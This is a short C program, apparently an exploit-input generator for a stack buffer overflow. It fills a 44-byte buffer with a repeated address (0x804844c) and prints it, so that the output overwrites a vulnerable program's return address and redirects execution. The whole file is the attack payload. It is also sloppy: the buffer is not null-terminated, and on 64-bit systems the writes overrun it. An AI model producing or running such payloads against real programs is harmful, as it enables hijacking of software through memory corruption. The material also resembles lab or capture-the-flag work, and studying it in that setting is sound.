#include <stdio.h>

int main()
{
    int i = 0;
    char stuffing[44];
    
    for (i = 0; i <= 42; i+=4)
    {
        *(long *) &stuffing[i] = 0x804844c;
    }
    puts(stuffing);

    return 0;
}
